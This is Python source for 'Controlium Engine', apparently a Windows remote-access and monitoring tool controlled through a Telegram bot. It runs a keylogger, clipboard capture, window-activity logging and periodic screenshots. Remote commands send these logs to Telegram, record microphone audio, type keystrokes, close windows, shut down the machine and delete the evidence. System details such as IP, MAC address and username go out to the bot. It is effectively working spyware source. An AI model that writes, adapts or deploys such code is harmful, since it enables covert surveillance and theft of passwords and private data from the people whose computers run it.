import os
import time
import uuid
import logging
import socket
import datetime
import subprocess
import threading
import psutil
import ctypes
import pygame.mixer
import pyperclip
import pyautogui
import telebot
import requests
import winshell
import webbrowser
import pyttsx3
import pygetwindow as gw
from pynput import keyboard
from tkinter import messagebox
from plyer import notification
import sounddevice as sd
import screen_brightness_control as scrn
from scipy.io.wavfile import write


BOT_TOKEN = "YOUR BOT TOKEN"

def telegram_alert(send):
    bot_token = BOT_TOKEN
    my_chatID = "CHAT ID"
    send_text = "https://api.telegram.org/bot" + bot_token + "/sendMessage?chat_id=" + my_chatID + "&parse_mode=Markdown&text=" + send

    response = requests.get(send_text)
    return response.json()

incognito = False

bot = telebot.TeleBot(BOT_TOKEN)
@bot.message_handler(func=lambda message: True)

def command_unit(message):
    global incognito

    try:
        if message.text.lower() == "/stop":
            notification.notify(
                title="Windows notification",
                message="Controlium engine shutdown",
                app_icon="appLogo.ico",
                timeout=3,)
            
            bot.reply_to(message, "Engine shutdown")
            subprocess.run(["taskkill", "/F", "/PID", str(pid)])

        elif message.text.lower() == "/log":
            try:
                with open(save_log_file, 'rb') as file:
                    bot.send_document(message.chat.id, file)

            except Exception as e:
                bot.reply_to(message, f"Error sending file: {e}")

        elif message.text.lower() == "/keylog":
            try:
                with open(key_log_file, 'rb') as file:
                    bot.send_document(message.chat.id, file)

            except Exception as e:
                bot.reply_to(message, f"Error sending file: {e}")

        elif message.text.lower() == "/sslog":
            try:
                with open("controlium-ss.jpg", 'rb') as file:
                    bot.send_document(message.chat.id, file)

            except Exception as e:
                bot.reply_to(message, f"Error sending file: {e}")

        elif message.text.lower() == "/notepad":
            os.startfile(f"C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/notepad.exe")
            bot.reply_to(message, "Opened Notepad")

        elif message.text.lower() == "/chrome":
            os.startfile("C:\Program Files\Google\Chrome\Application\chrome.exe")
            bot.reply_to(message, "Opened Chrome")

        elif message.text.lower() == "/vscode":
            os.startfile(f"C:/Users/{username}/AppData/Local/Programs/Microsoft VS Code/Code.exe")
            bot.reply_to(message, "Opened Visual Studio Code")

        elif message.text.lower() == "/word":
            os.startfile("C:/Program Files/Microsoft Office/root\Office16/WINWORD.EXE")
            bot.reply_to(message, "Opened Microsoft Word")

        elif message.text.lower() == "/powerpoint":
            os.startfile("C:/Program Files/Microsoft Office/root/Office16/POWERPNT.EXE")
            bot.reply_to(message, "Opened PowerPoint")

        elif message.text.lower() == "/excel":
            os.startfile("C:/Program Files/Microsoft Office/root/Office16/EXCEL.EXE")
            bot.reply_to(message, "Opened Microsoft Excel")

        elif message.text.lower() == "/edge":
            os.startfile("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
            bot.reply_to(message, "Opened Microsoft Edge")

        elif message.text.lower() == "/files":
            os.startfile("C:/Windows/explorer.exe")
            bot.reply_to(message, "Opened File Explorer")

        elif message.text.lower() == "/alert":
            bot.reply_to(message, "Enter messeage")

            def win_notification(message):
                msg = message.text
                notification.notify(
                    title="Windows notification",
                    message=msg,
                    app_icon="appLogo.ico",
                    timeout=5,)
                bot.reply_to(message, "Done")
    
            bot.register_next_step_handler(message, win_notification)

        elif message.text.lower() == "/popup":
            bot.reply_to(message, "Enter messeage")

            def popup(message):
                msg = message.text
                messagebox.showwarning("Windows", msg)
                bot.reply_to(message, "Done")
                
            bot.register_next_step_handler(message, popup)

        elif message.text.lower() == "/ss":
            screenshot = pyautogui.screenshot()
            screenshot.save("controlium-ss.jpg")
            bot.reply_to(message, "Screenshot taken")

            try:
                with open("controlium-ss.jpg", 'rb') as file:
                    bot.send_document(message.chat.id, file)

            except Exception as e:
                bot.reply_to(message, f"Error sending file: {e}")

        elif message.text.lower() == "/record":
            bot.reply_to(message, "Audio recording...")

            frequency = 44100
            duration = 10
            record_audio = sd.rec(int(duration * frequency), samplerate=frequency, channels=2)
            sd.wait()
            write("Audio/controlium-rec.wav", frequency, record_audio)
            bot.reply_to(message, "Audio recorded")

            try:
                with open("Audio/controlium-rec.wav", 'rb') as file:
                    bot.send_document(message.chat.id, file)

            except Exception as e:
                bot.reply_to(message, f"Error sending file: {e}")

        elif message.text.lower() == "/nobg":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "", 3)
            bot.reply_to(message, "Removed wallpaper")

        elif "audio" in message.text.lower():
            audio_num = message.text.split()[1]
            pygame.mixer.init()
            pygame.mixer.music.load(f"Audio/audio{audio_num}.mp3")
            pygame.mixer.music.play(0)
            bot.reply_to(message, f"Playing audio {audio_num}")

        elif message.text.lower() == "/mute":
            pygame.mixer.music.stop()
            bot.reply_to(message, "Audio stopped")

        elif "volup" in message.text.lower():
            vol = message.text.split()[1]
            vol_level = int(vol)

            for v in range(vol_level):
                pyautogui.press('volumeup')

            bot.reply_to(message, f"Volume increased by {vol_level}")

        elif "voldown" in message.text.lower():
            vol = message.text.split()[1]
            vol_level = int(vol)

            for v in range(vol_level):
                pyautogui.press('volumedown')

            bot.reply_to(message, f"Volume decreased by {vol_level}")

        elif "brightness" in message.text.lower():
            brightness = message.text.split()[1]
            brightness_lvl = int(brightness)

            scrn.set_brightness(brightness_lvl)

            bot.reply_to(message, f"Screen brightness: {brightness_lvl}%")

        elif message.text.lower() == "/getfocus":
            focus_window = gw.getActiveWindow()
            bot.reply_to(message, f"Window in focus: {focus_window.title}")

        elif message.text.lower() == "/getallwin":
            open_windows = gw.getWindowsWithTitle("")
            for window in open_windows:
                telegram_alert(window.title)

        elif message.text.lower() == "/closefocus":
            focus_window = gw.getActiveWindow()
            if focus_window is not None:
                focus_window.close()

            bot.reply_to(message, f"Closed {focus_window.title}")

        elif message.text.lower() == "/closeall":
            open_win = gw.getAllWindows()
            for window in open_win:
                window.close()

            bot.reply_to(message, "Closed all windows")

        elif message.text.lower() == "/enter":
            pyautogui.hotkey('enter')
            bot.reply_to(message, "Done")

        elif message.text.lower() == "/undo":
            pyautogui.hotkey('ctrl', 'z')
            bot.reply_to(message, "Done")

        elif message.text.lower() == "/copy":
            pyautogui.hotkey('ctrl', 'c')
            bot.reply_to(message, "Done")

        elif message.text.lower() == "/paste":
            pyautogui.hotkey('ctrl', 'v')
            bot.reply_to(message, "Done")

        elif message.text.lower() == "/delete":
            pyautogui.hotkey('delete')
            bot.reply_to(message, "Done")

        elif "#" in message.text.lower():
            user_chars = message.text
            pyautogui.typewrite(user_chars)
            bot.reply_to(message, "Done")

        elif message.text.lower() == "/signout":
            subprocess.call(["shutdown", "/l"])
            bot.reply_to(message, "System sign out")

        elif message.text.lower() == "/hibernate":
            os.system("shutdown /h")
            bot.reply_to(message, "System hibernation")

        elif message.text.lower() == "/shutdown":
            os.system("shutdown /s /t 30")
            bot.reply_to(message, "System shutdown")

        elif message.text.lower() == "/bin":
            winshell.recycle_bin().empty(confirm=False, show_progress=True, sound=True)
            bot.reply_to(message, "Recycle bin cleared")

        elif message.text.lower() == "/incognito":
            incognito = True
            bot.reply_to(message, "Incognito mode enabled")

        elif message.text.lower() == "/incogoff":
            incognito = False
            bot.reply_to(message, "Incognito mode disabled")

        elif message.text.lower() == "/clearlogs":
            try:
                act_log = "Activity"
                txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt")]

                for f in txtfiles:
                    os.remove(os.path.join(act_log, f))
                bot.reply_to(message, "Deleted activity logs")

            except Exception as e:
                bot.reply_to(message, "Deleted activity logs")
                bot.reply_to(message, f"ERROR >> {e}")

            key_log = "Keystroke"
            txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]

            for f in txtfiles2:
                os.remove(os.path.join(key_log, f))
            bot.reply_to(message, "Deleted keystroke logs")

            os.remove("controlium-ss.jpg")
            bot.reply_to(message, "Deleted screenshot")

            os.remove("Audio/controlium-rec.wav")
            bot.reply_to(message, "Deleted audio file")

        elif "clean" in message.text.lower():
            month = message.text.split()[1].capitalize()
            
            try:
                act_log = "Activity"
                txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt") and f.startswith(month)]

                for f in txtfiles:
                    os.remove(os.path.join(act_log, f))
                bot.reply_to(message, f"Deleted logs: {month}")

            except Exception as e:
                bot.reply_to(message, f"ERROR >> {e}")

        elif ">" in message.text.lower():
            usr_msg = message.text
            speech_engine(usr_msg)
            bot.reply_to(message, "Done")

        elif message.text.lower() == "/time":
            time = datetime.datetime.now().strftime("%H:%M")
            speech_engine(f"The time is {time}")
            bot.reply_to(message, "Done")

        elif "search" in message.text.lower():
            indx = message.text.lower().split().index("search")
            conv = message.text.split()[indx + 1:]
            query = ' '.join([str(item) for item in conv])
            webbrowser.open(f"https://www.google.com/search?q={query}")
            bot.reply_to(message, f"Searching {query}")

        elif message.text.lower() == "/version":
            bot.reply_to(message, "Controlium Engine v1.6.0")

        else:
            bot.reply_to(message, "Invalid command")
            
    except Exception as e:
        bot.reply_to(message, f"ERROR >> {e}")

###############################################################################################

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
username = os.getlogin()
cpu_usage = psutil.cpu_percent(interval=1)
ram = psutil.virtual_memory()
ram_used = ram.used / (1024**3)
ram_available = ram.available / (1024**3)
boot_time = psutil.boot_time()
uptime = datetime.datetime.fromtimestamp(boot_time)
pid = os.getpid()


folder1 = os.path.exists("Activity")
if folder1 == False:
    os.mkdir("Activity")

folder2 = os.path.exists("Keystroke")
if folder2 == False:
    os.mkdir("Keystroke")

date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
log_file = str(date).replace(":", "-") + "-log.txt"
folder = "Activity"
save_log_file = os.path.join(folder, log_file)

date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
log_file = str(date).replace(":", "-") + "-keylog.txt"
folder = "Keystroke"
key_log_file = os.path.join(folder, log_file)

logging.basicConfig(filename=save_log_file, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
logged_windows = set()


def windows_logger():
    try:
        global logged_windows
        open_windows = gw.getWindowsWithTitle("")
        for window in open_windows:
            if window.title not in logged_windows:
                logging.info(f"Opened {window.title}")
                logged_windows.add(window.title)

                if window.title == "This PC":
                    logging.info("Opened File Explorer")
                elif window.title == "D:/":
                    logging.info("Opened Local Disk")
                elif window.title == "E:/":
                    logging.info("Opened Local Disk")

        for title in logged_windows.copy():
            if title not in gw.getAllTitles():
                logging.info(f"Closed {title}")
                logged_windows.remove(title)
    except:
        pass


def key_press(key):
    if incognito != True:

        try:
            with open(key_log_file, "a") as f:
                f.write(f"Key pressed: {key.char}\n")
        except AttributeError:
            with open(key_log_file, "a") as f:
                f.write(f"Key pressed: {key}\n")

def key_release(key):
    if key == keyboard.Key.esc:
        return False
    

def keystroke_logger():
    time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
    with open(key_log_file, "a") as f:
        f.write(f'''CONTROLIUM ENGINE v1.6.0
{str(time_stamp)}
<< KEYSTROKE LOG >>

> IP Address: {ip}
> MAC Address: {mac}
> Active user: {username}
> CPU Usage: {cpu_usage}%
> RAM Usage: {ram_used:.2f} GB
> Available RAM: {ram_available:.2f} GB
> System uptime: {uptime}
> Process ID: {pid}

''')
    with keyboard.Listener(on_press=key_press, on_release=key_release) as watcher:
        watcher.join()


def activity_logger():
    time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
    logging.info(f'''CONTROLIUM ENGINE v1.6.0
{str(time_stamp)}
<< ACTIVITY LOG >>

> IP Address: {ip}
> MAC Address: {mac}
> Active user: {username}
> CPU Usage: {cpu_usage}%
> RAM Usage: {ram_used:.2f} GB
> Available RAM: {ram_available:.2f} GB
> System uptime: {uptime}
> Process ID: {pid}
''')
    while True:
        if incognito != True:
            windows_logger()
        
            time.sleep(5)
            screenshot = pyautogui.screenshot()
            screenshot.save("controlium-ss.jpg")


def network_connection():
    result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
    output = result.stdout
    ssid_line = [line for line in output.splitlines() if "SSID" in line]

    if ssid_line:
        ssid = ssid_line[0].split(":")[1].strip()
        logging.info(f"Connected to network: {ssid}")
    else:
        logging.info("Not connected to a network")


def clipboard_activity():
    before_clipboard = pyperclip.paste()

    while True:
        current_clipboard = pyperclip.paste()
        if current_clipboard != before_clipboard and incognito != True:
            logging.info(f"Clipboard changes: {current_clipboard}")
            before_clipboard = current_clipboard


def clear_logs():
    while True:
        try:
            act_log = "Activity"
            txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt")]

            time.sleep(600)
            for f in txtfiles:
                os.remove(os.path.join(act_log, f))
        except:
            pass

        key_log = "Keystroke"
        txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]
        for f in txtfiles2:
            os.remove(os.path.join(key_log, f))


def telegram_bot():
    while True:
        try:
            telegram_alert(f"System online - {username}")
            bot.polling()
        except:
            time.sleep(5)

def speech_engine(speak):
    engine = pyttsx3.init("sapi5")
    engine.setProperty("rate", 150)
    voices = engine.getProperty('voices')
    engine.setProperty("voice", voices[0].id)
    engine.say(speak)
    engine.runAndWait()


##########################################################################################

if __name__ == "__main__":
    keystroke_thread = threading.Thread(target=keystroke_logger) # Thread 1
    activity_thread = threading.Thread(target=activity_logger) # Thread 2
    network_thread = threading.Thread(target=network_connection) # Thread 3
    clipboard_thread = threading.Thread(target=clipboard_activity) # Thread 4
    clear_logs_thread = threading.Thread(target=clear_logs) # Thread 5
    telegram_bot_thread = threading.Thread(target=telegram_bot) # Thread 6

    keystroke_thread.start()
    activity_thread.start()
    network_thread.start()
    clipboard_thread.start()  
    clear_logs_thread.start()
    telegram_bot_thread.start()

    keystroke_thread.join()
    activity_thread.join()
    network_thread.join()
    clipboard_thread.join()
    clear_logs_thread.join()
    telegram_bot_thread.join()






# MIT License
# Copyright (c) 2024 Ashfaaq Rifath - Controlium Engine v1.6.0
# All rights reserved.

# T6 Engine
# USE WITH CAUSION
